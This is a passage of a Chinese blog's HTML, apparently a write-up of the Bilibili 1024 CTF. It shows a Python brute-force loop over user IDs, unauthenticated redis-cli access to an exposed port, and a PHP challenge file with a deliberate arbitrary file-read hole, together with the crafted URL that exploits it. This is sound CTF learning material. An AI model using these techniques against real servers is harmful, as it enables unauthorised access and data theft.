class="built_in">range</span>(<span class="number">100336889</span>, <span class="number">100337000</span>):</span><br><span class="line">        response = s.get(</span><br><span class="line">            url=url + <span class="built_in">str</span>(i), headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(i, response.text)</span><br></pre></td></tr></table></figure>
+
+<p>爆搜到 <code>100336921</code> 的时候出现了 HTTP 200 和 flag 字符串，但我并高兴不起来，我总觉得是不是还有别的方法可以得到这个 uid。（问了下其他人，他们的是 923，而我的是 921，看来答案还具有多样性）</p>
+<h2 id="0x06-让我看看题目到底是啥好不好球球了"><a href="#0x06-让我看看题目到底是啥好不好球球了" class="headerlink" title="0x06 让我看看题目到底是啥好不好球球了"></a>0x06 让我看看题目到底是啥好不好球球了</h2><blockquote>
+<p>结束亦是开始<br>题目地址： <a target="_blank" rel="noopener" href="http://45.113.201.36/blog/single.php?id=1">http://45.113.201.36/blog/single.php?id=1</a></p>
+</blockquote>
+<p>从这里开始，题目就不从 start 页面中获得了。<br>可以认为一条新的线路从这个新的 ip 站点开始了。<br>——对不起，等我们赶到的时候，这个站点已经连不上，就只剩下这个缓存页面了。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201025201256412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29rY2QwMA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="0x08-你们就不想让这个服务器活着"><a href="#0x08-你们就不想让这个服务器活着" class="headerlink" title="0x08 你们就不想让这个服务器活着"></a>0x08 你们就不想让这个服务器活着</h2><p>知道为什么第六题老上不去吗？<br>因为第八题要扫开放端口。<br>大家都不知道是哪个端口所以都在扫，这个一般来说叫什么呢？<br>嗯，叫DDOS。</p>
+<p>就不说怎么扫端口了，for 循环挨个试验比较呆，直接告诉你们是 6379 端口。<br>下载一个Redis客户端：<br><a target="_blank" rel="noopener" href="https://github.com/microsoftarchive/redis/releases">https://github.com/microsoftarchive/redis/releases</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 120.92.151.189  -p  6379</span><br><span class="line">(120.92.151.189:6379) &gt; keys *</span><br><span class="line">1) &quot;flag4&quot;</span><br><span class="line">2) &quot;flag5&quot;</span><br><span class="line">...</span><br><span class="line">11) &quot;flag8&quot;</span><br><span class="line">(120.92.151.189:6379) &gt; get flag8</span><br><span class="line">&#123;flag8:d436b982-2b81aa54-49a8d2db-87ab951a&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="0x10-你们这套操作是我七夕玩剩下的"><a href="#0x10-你们这套操作是我七夕玩剩下的" class="headerlink" title="0x10 你们这套操作是我七夕玩剩下的"></a>0x10 你们这套操作是我七夕玩剩下的</h2><blockquote>
+<p>七夕的时候给 @ZoeCUR 写了个CTF当礼物（然后被好友喷了个狗血淋头说我是钛合金直男），用的方法和这题几乎完全一样 = =</p>
+</blockquote>
+<p>首先试着打开了 <a target="_blank" rel="noopener" href="http://120.92.151.189/blog/test.php">http://120.92.151.189/blog/test.php</a><br>看到了一个只由 <code>![]&#123;&#125;</code> 组成的文本，我第一时间居然去找了猴语解码，是我孤陋寡闻了。询问 dalao 后得知这东西叫 JSFuck 编码……<br>你们这些写JS的怎么回事？！</p>
+<p>总之解码之后可以得到两个字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;程序员最多的地方&quot;</span><br><span class="line">&quot;bilibili1024havefun&quot;</span><br></pre></td></tr></table></figure>
+
+<p>刚看到这里我就突然有种既视感，别是要在github上找到个文件，然后文件指向一张图片，然后图片里藏了个字符串，然后字符串解码是个七夕祝福视频啊（事实证明除了七夕祝福视频，都一样……）！</p>
+<p>在我回头写这篇博客的时候才发现 Github 上蹭热度的人已经把搜索结果污染了 23333，蹭还是你们会蹭，有星吗就蹭？（我的天还真有人拿了三颗，我酸了）<br><img src="https://img-blog.csdnimg.cn/20201025203315769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29rY2QwMA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201025203443277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29rY2QwMA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们不管那些蹭热度的，总之真实的文件是这个<br><a target="_blank" rel="noopener" href="https://github.com/interesting-1024/end/blob/main/end.php">https://github.com/interesting-1024/end/blob/main/end.php</a></p>
+<p>文件内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//filename end.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$bilibili</span> = <span class="string">&quot;bilibili1024havefun&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = intval(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$reg</span> = preg_match(<span class="string">&#x27;/\d/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$reg</span> !== <span class="number">1</span> <span class="keyword">and</span> <span class="variable">$str</span> === <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="variable">$content</span> = file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//文件路径猜解</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">false</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;还差一点点啦～&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;你想要的不在这儿～&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>里面是一个提示，告诉我们有个叫 end.php 的东西，好我们回头到目标IP的靶机上。照抄学一个 url：</p>
+<p><code>http://120.92.151.189/blog/end.php?id[]=1&amp;url=/api/ctf/6/flag.txt</code><br>暂时截不了图……写到这目标网站又连不上了……<br>总之随便构造，只要满足条件的传参无论你写啥都是能拿到一张图<br><img src="https://img-blog.csdnimg.cn/20201025204144474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L29rY2QwMA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>CSDN上传的图片是压缩的，图片各位还是得自己下载。<br>用记事本打开图片的末尾就能看到 Flag：</p>
+<p>{flag10:2ebd3b08-47ffc478-b49a5f9d-f6099d65}</p>
+
+    </div>
+
+    
+
+    
+
+    <!-- Comments -->
+    
+    <div class="comments">
+        
+<div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+
+
+    </div>
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    Coding the world, try to fetch more.
+                </p>
+                <script type="text/javascript" src="//rf.revolvermaps.com/0/0/6.js?i=5mihyim0z76&amp;m=7&amp;c=66ccff&amp;cr1=ff0000&amp;f=arial&amp;l=0&amp;lx=200&amp;ly=-20&amp;hi=10" async="async"></script>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/articles/2020-10/%E3%80%90Requests%E3%80%91Bilibili%20Security%201024%E7%A8%8B%E5%BA%8F%E8%8A%82%20CTF%E8%AE%B0%E5%BD%95.html">【Requests】Bilibili Security 1024程序节 CTF记</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/articles/2020-09/%E3%80%90CheatEngine%E3%80%91%E5%85%B3%E4%BA%8EBCR%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90.html">【CheatEngine】关于BCR的内存分析</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/articles/2020-04/%E3%80%90Grpc%E3%80%91%E4%BD%BF%E7%94%A8grpc%E9%85%8D%E7%BD%AE%E9%80%9A%E8%BF%87%E7%AB%AF%E5%8F%A3%E8%AE%BF%E9%97%AE%E7%9A%84python%E6%9C%8D%E5%8A%A1.html">【Grpc】使用grpc配置通过端口访问的python服务</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/articles/2020-02/%E3%80%90HNS%E3%80%91%E8%AF%95%E7%9D%80%E9%A2%86%E4%B8%80%E4%B8%8B%20HandShake%20%E4%B8%BA%E5%BC%80%E6%BA%90%E7%A4%BE%E5%8C%BA%E5%8F%91%E6%94%BE%E7%9A%84%20HNS%20Coin.html">【HNS】试着领一下 HandShake 发给开源社区的 HNS Coin</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/%E8%A7%A3%E9%A2%98%E6%8A%A5%E5%91%8A/">解题报告</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/">论文阅读</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/">日常记录</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BF%86/">编程记忆</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/%E5%8A%9F%E8%83%BD%E8%84%9A%E6%9C%AC/">功能脚本</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/okcd00/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://twitter.com/okcd00/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="http://okcd00.oschina.io/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-star-half-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:okcd00@vip.qq.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="http://blog.csdn.net/okcd00">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-pencil-square-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @<a target="_blank" rel="noopener" href="https://github.com/okcd00/">Dian Chen</a>. 2017-2022 All right reserved | Re-design & Deploy: <a href="blog.csdn.net/okcd00">okcd00</a> | Hexo Theme: <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'okcd00';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<!-- "//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js" -->
+<script type="text/javascript" color="0,255,255" opacity='0.75' zIndex="-2" count="75" src='/js/canvas.js'></script>
+
+</body>
+</html>
